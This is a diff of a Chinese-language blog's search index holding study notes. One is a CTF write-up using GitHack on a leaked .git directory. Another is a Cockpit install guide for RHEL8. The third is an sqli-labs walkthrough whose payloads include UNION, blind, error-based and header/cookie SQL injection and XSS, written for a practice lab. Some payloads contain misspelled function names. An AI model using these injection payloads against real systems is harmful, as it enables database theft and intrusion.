@@ -1,6 +1,23 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BUUCTF[BJDCTF2020]Mark loves cat</title>
+    <url>/2020/09/20/BUUCTF-BJDCTF2020-Mark-loves-cat/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><a id="more"></a>
+<p>一开局看样子可能是已知cms的漏洞的利用<br><img src="https://i.loli.net/2020/09/20/ckrmQGbNgTolFi3.png" alt="image.png"><br>开始扫一波后台试试<br>没扫到后台，但是发现一个挺有趣的东西<br><img src="https://i.loli.net/2020/09/20/8WkrtnuKzvGDwaU.png" alt="image.png"><br>git源码泄露</p>
+<p>这时候就要祭出githack了<br><code>python GitHack.py http://Domain/.git/</code></p>
+<p>接下来就是代码审计了<br>这无能为力，只能去看看大牛们之前的wp</p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+        <tag>渗透</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUUCTF[SUCTF 2019]EasySQL</title>
     <url>/2020/09/17/BUUCTF-SUCTF-2019-EasySQL/</url>
     <content><![CDATA[<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><a id="more"></a>
@@ -36,20 +53,29 @@
       </tags>
   </entry>
   <entry>
-    <title>BUUCTF[BJDCTF2020]Mark loves cat</title>
-    <url>/2020/09/20/BUUCTF-BJDCTF2020-Mark-loves-cat/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><a id="more"></a>
-<p>一开局看样子可能是已知cms的漏洞的利用<br><img src="https://i.loli.net/2020/09/20/ckrmQGbNgTolFi3.png" alt="image.png"><br>开始扫一波后台试试<br>没扫到后台，但是发现一个挺有趣的东西<br><img src="https://i.loli.net/2020/09/20/8WkrtnuKzvGDwaU.png" alt="image.png"><br>git源码泄露</p>
-<p>这时候就要祭出githack了<br><code>python GitHack.py http://Domain/.git/</code></p>
-<p>接下来就是代码审计了<br>这无能为力，只能去看看大牛们之前的wp</p>
+    <title>Cockpit For RHEL8</title>
+    <url>/2020/03/05/Cockpit-For-RHEL8/</url>
+    <content><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><blockquote>
+<p><a href="https://cockpit-project.org/">Cockpit</a> : The <a href="https://cockpit-project.org/#easy-to-use">easy-to-use</a>, <a href="https://cockpit-project.org/#integrated">integrated</a>, <a href="https://cockpit-project.org/#glanceable">glanceable</a>, and <a href="https://cockpit-project.org/#open-ended">open</a> web-based interface for your servers .</p>
+</blockquote>
+<a id="more"></a>
+
+<p>在RHEL8上自动安装了Cockpit，因此不需要添加任何非默认的软件库。</p>
+<p>如果是RHEL7的话则需要添加Extras软件库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo subscription-manager repos --enable rhel-7-server-extras-rpms</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h1 id="0x01-开始安装"><a href="#0x01-开始安装" class="headerlink" title="0x01 开始安装"></a>0x01 开始安装</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo yum install cockpit -y 		&#x2F;&#x2F;安装Cockpit</span><br><span class="line"></span><br><span class="line">$ sudo systemctl enable --now cockpit.socket 		&#x2F;&#x2F;设置开机自启动</span><br><span class="line"></span><br><span class="line">$ sudo firewall-cmd --add-service&#x3D;cockpit --permanent 		&#x2F;&#x2F;打开防火墙放行Cockpit</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="0x02-开始使用"><a href="#0x02-开始使用" class="headerlink" title="0x02 开始使用"></a>0x02 开始使用</h1><p>如果服务器上已经安装了Cockpit，则将Web浏览器指向： <strong>https://</strong> <strong>IP:9090</strong></p>
+<p>且使用系统用户帐户和密码登录。</p>
+<p><img src="https://i.loli.net/2020/03/05/QbFvErRzWBfLpxg.png" alt="1.png"></p>
+<p><img src="https://i.loli.net/2020/03/05/ISqGdka8HfbT67B.png" alt="2.png"></p>
+<p><a href="https://cockpit-project.org/guide/latest/">Cockpit Guide</a></p>
 ]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
       <tags>
-        <tag>笔记</tag>
-        <tag>渗透</tag>
-        <tag>CTF</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -76,32 +102,6 @@
         <tag>笔记</tag>
         <tag>渗透</tag>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Cockpit For RHEL8</title>
-    <url>/2020/03/05/Cockpit-For-RHEL8/</url>
-    <content><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><blockquote>
-<p><a href="https://cockpit-project.org/">Cockpit</a> : The <a href="https://cockpit-project.org/#easy-to-use">easy-to-use</a>, <a href="https://cockpit-project.org/#integrated">integrated</a>, <a href="https://cockpit-project.org/#glanceable">glanceable</a>, and <a href="https://cockpit-project.org/#open-ended">open</a> web-based interface for your servers .</p>
-</blockquote>
-<a id="more"></a>
-
-<p>在RHEL8上自动安装了Cockpit，因此不需要添加任何非默认的软件库。</p>
-<p>如果是RHEL7的话则需要添加Extras软件库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo subscription-manager repos --enable rhel-7-server-extras-rpms</span><br></pre></td></tr></table></figure>
-
-
-<hr>
-<h1 id="0x01-开始安装"><a href="#0x01-开始安装" class="headerlink" title="0x01 开始安装"></a>0x01 开始安装</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo yum install cockpit -y 		&#x2F;&#x2F;安装Cockpit</span><br><span class="line"></span><br><span class="line">$ sudo systemctl enable --now cockpit.socket 		&#x2F;&#x2F;设置开机自启动</span><br><span class="line"></span><br><span class="line">$ sudo firewall-cmd --add-service&#x3D;cockpit --permanent 		&#x2F;&#x2F;打开防火墙放行Cockpit</span><br></pre></td></tr></table></figure>
-<hr>
-<h1 id="0x02-开始使用"><a href="#0x02-开始使用" class="headerlink" title="0x02 开始使用"></a>0x02 开始使用</h1><p>如果服务器上已经安装了Cockpit，则将Web浏览器指向： <strong>https://</strong> <strong>IP:9090</strong></p>
-<p>且使用系统用户帐户和密码登录。</p>
-<p><img src="https://i.loli.net/2020/03/05/QbFvErRzWBfLpxg.png" alt="1.png"></p>
-<p><img src="https://i.loli.net/2020/03/05/ISqGdka8HfbT67B.png" alt="2.png"></p>
-<p><a href="https://cockpit-project.org/guide/latest/">Cockpit Guide</a></p>
-]]></content>
-      <tags>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -194,6 +194,139 @@
 <p>进行闭合后插入注入验证</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; AND IF(LENGTH(DATABASE())&gt;0,SLEEP(3),1) --+</span><br></pre></td></tr></table></figure>
 <p>验证成功，扔sqlmap</p>
+<hr>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+        <tag>渗透</tag>
+        <tag>sqli-lab</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-lab Less 11-Less 22</title>
+    <url>/2020/08/30/sqli-lab-Less-11-Less-22/</url>
+    <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-11-Less-22"><a href="#Sqli-lab-过关笔记-Less-11-Less-22" class="headerlink" title="Sqli-lab 过关笔记 Less 11-Less 22"></a>Sqli-lab 过关笔记 Less 11-Less 22</h1><a id="more"></a>
+<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>首先测试语句闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;&amp;passwd=11111&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p>得到报错信息提示</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span><span class="string">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
+<p>大致推断其sql查询语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> UNAME<span class="operator">=</span><span class="string">&#x27;uname&#x27;</span>,PASSWD<span class="operator">=</span><span class="string">&#x27;passwd&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>在PASSWD构造闭合，进行注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT DATABASE(),USER() -- JDNJD </span></span><br></pre></td></tr></table></figure>
+<p>成功，然后扔sqlmap</p>
+<hr>
+<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>测试闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
+<p>报错信息</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span>&quot;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p>构造闭合注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;) UNION SELECT DATABASE(),USER() -- sdk </span><br></pre></td></tr></table></figure>
+<p>成功，扔sqlmap</p>
+<hr>
+<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>测试闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
+<p>报错</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span><span class="string">&#x27;) LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
+<p>构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;) UNION SELECT USER(),DATABASE() -- JSDN </span></span><br></pre></td></tr></table></figure>
+<p>界面不再回显信息<br>但是</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../images/flag.jpg&quot;</span>   /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>所以进行盲注</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;) AND LENGTH(DATABASE())=8  -- JSDN </span></span><br></pre></td></tr></table></figure>
+<p>返回是错误，检查原因，是因为passwd并不正确，所以使用</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;) OR LENGTH(DATABASE())=8  -- JSDN </span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>测试闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
+<p>报错</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span>&quot; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p>构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1111</span>&quot; OR LENGTH(DATABASE())=8 -- SJSN </span><br></pre></td></tr></table></figure>
+<p>返回flag.jpg，成功</p>
+<hr>
+<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>测试闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
+<p>这里不再提示错误的语句只返回slap.jpg</p>
+<p>开始手工fuzzing闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR 1=1 -- sjjs </span></span><br></pre></td></tr></table></figure>
+<p>返回flag.jpg<br>开始构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR LENGTH(DATABASE())=8 -- sjjs </span></span><br></pre></td></tr></table></figure>
+<p>返回flag.jpg，成功</p>
+<hr>
+<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>同样开始fuzzing测试闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;) OR 1=1 -- DDD </span><br></pre></td></tr></table></figure>
+<p>返回flag.jpg</p>
+<p>开始构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;) OR LENGTH(DATABASE())=8 -- DDD </span><br></pre></td></tr></table></figure>
+<p>返回flag.jpg，成功</p>
+<hr>
+<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这里可以看到是密码更新的一关<br>首先输入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
+<p>返回flag1.jpg是密码更新成功</p>
+<p>输入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27; &amp;passwd=11111&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p>返回slap1.jpg提示<code>BUG OFF YOU SILLY DUMB HACKER</code><br>输入    </p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="string">&#x27; &amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p>返回报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;admin&#39;&#39; at line 1</code></p>
+<p>看来是passwd字段存在注入，<br>开始构造报错注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR UPATDEXML(1,CONCAT(0X74,(SELECT DATABASE()),0X74),1) -- DJD</span></span><br></pre></td></tr></table></figure>
+<p>爆出错误</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FUNCTION</span> security.UPATDEXML does <span class="keyword">not</span> exist</span><br></pre></td></tr></table></figure>
+<p>爆出数据库名，成功</p>
+<hr>
+<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>首先输入错误的密码，页面依旧显示ip，输入正确的密码后页面显示User Agent<br>发现直接显示user agent尝试xss</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">(alert(<span class="regexp">/1/</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>弹出页面成功<br>开始测试用户名密码的注入，fuzzing后无结果，既然页面要返回user agent，必定要做处理</p>
+<p>测试user agent字段的闭合方式测试出是单引号</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="operator">/</span><span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">80.0</span>) Gecko<span class="operator">/</span><span class="number">20100101</span> Firefox<span class="operator">/</span><span class="number">80.0</span> <span class="string">&#x27; OR SLEEP(5) -- SHDH </span></span><br></pre></td></tr></table></figure>
+<p>页面依旧正常并没有延时，查阅资料后发现等如下闭合单引号</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="operator">/</span><span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">80.0</span>) Gecko<span class="operator">/</span><span class="number">20100101</span> Firefox<span class="operator">/</span><span class="number">80.0</span> <span class="string">&#x27; OR SLEEP(5) OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> </span><br></pre></td></tr></table></figure>
+<p>成功延时，翻阅源代码后发现</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uagent <span class="operator">=</span> $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">	$IP <span class="operator">=</span> $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line">			mysql_query($<span class="keyword">insert</span>);</span><br></pre></td></tr></table></figure>
+<p>可见这里对于传入的uname和passwd值做了一个过滤，而对于uagent则没有防护，引起http头注入</p>
+<hr>
+<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>根据Less-18的经验很快确定是Referer头的注入，且依旧未对内容进行实体化，造成xss</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Referer: http://192.168.98.133/sqli/Less-19/ <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>根据Less-18的闭合思路</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Referer: http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.98</span><span class="number">.133</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-19</span><span class="operator">/</span> <span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>闭合成功</p>
+<p>构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Referer: http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.98</span><span class="number">.133</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-19</span><span class="operator">/</span> <span class="string">&#x27; OR UPADTAXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>成功爆出<code>FUNCTION security.UPADTAXML does not exist</code><br>成功</p>
+<hr>
+<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>关卡提示是Cookies注入，首先测试一下，发现会跳转<br>慢慢放包发现</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/sqli/Less-20/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.98.133</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.98.133/sqli/Less-20/index.php</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=admin</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
+<p>放过后页面提示</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0</span><br><span class="line">YOUR IP ADDRESS IS : 192.168.98.1</span><br><span class="line">DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE</span><br><span class="line">YOUR COOKIE : uname = admin and expires: Sun 30 Aug 2020 - 15:23:53</span><br><span class="line">Your Login name:admin</span><br><span class="line">Your Password:11111</span><br><span class="line">Your ID:8</span><br></pre></td></tr></table></figure>
+<p>又是一堆没有过滤，也能插xss</p>
+<p>我们把注意力放在cookies上<br>构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span>admin <span class="string">&#x27; or extractvalue(1,concat(user(),0x7e,database())) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>返回<code>Issue with your mysql: XPATH syntax error: &#39;@localhost~security&#39;</code><br>成功</p>
+<p>接下来试试前一个登录页面是否存在注入，发现突破不了<br>一打开源码，果然，又有过滤。。。。。</p>
+<hr>
+<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>这次果断不测试前面，肯定有过滤直接走后面流程<br>页面中又是熟悉的xss的香味，可惜是x自己<br>看到请求包可以很明显的看到不同</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4%3D</span><br></pre></td></tr></table></figure>
+<p>通过base64解码可知内容<code>admin</code></p>
+<p>嗯开始构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>加密后<br><code>JyBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICcxJz0nMQ==</code><br>爆出错误<br><code>Issue with your mysql: XPATH syntax error: &#39;~security~&#39;</code><br>成功</p>
+<p>这里再对user agent进行注入，发现失败</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;YOUR USER AGENT IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br></pre></td></tr></table></figure>
+<p>这里作者并未进行sql操作，只是直接打印</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">			<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+<p>而对于cookee则是进行了查询，且这里的cookee只是简单进行了base64加密，而并未进行过滤操作</p>
+<hr>
+<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>这里依旧是一个cookies的注入<br>首先根据Less-21的payload直接插</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4%3DJyBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICcxJz0nMQ==</span><br></pre></td></tr></table></figure>
+<p>失败<br>换个闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot; OR UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) OR &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">IiBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICIxIj0iMQ<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>
+<p>爆出<br><code>Issue with your mysql: XPATH syntax error: &#39;~security~&#39;</code><br>嘻嘻，成功</p>
 <hr>
 ]]></content>
       <categories>
@@ -343,139 +476,6 @@
 <p>使用堆叠注入我们可以用分号分隔开sql语句，但回显的只有第一条，但是后面拼接的可以实现增删改，甚至可以写shell</p>
 <p><a href="https://www.sqlinjection.net/stacked-queries/">相关资料</a></p>
 <p>就到这里</p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-        <tag>渗透</tag>
-        <tag>sqli-lab</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-lab Less 11-Less 22</title>
-    <url>/2020/08/30/sqli-lab-Less-11-Less-22/</url>
-    <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-11-Less-22"><a href="#Sqli-lab-过关笔记-Less-11-Less-22" class="headerlink" title="Sqli-lab 过关笔记 Less 11-Less 22"></a>Sqli-lab 过关笔记 Less 11-Less 22</h1><a id="more"></a>
-<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>首先测试语句闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;&amp;passwd=11111&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
-<p>得到报错信息提示</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span><span class="string">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
-<p>大致推断其sql查询语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> UNAME<span class="operator">=</span><span class="string">&#x27;uname&#x27;</span>,PASSWD<span class="operator">=</span><span class="string">&#x27;passwd&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>在PASSWD构造闭合，进行注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT DATABASE(),USER() -- JDNJD </span></span><br></pre></td></tr></table></figure>
-<p>成功，然后扔sqlmap</p>
-<hr>
-<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>测试闭合方式</p>
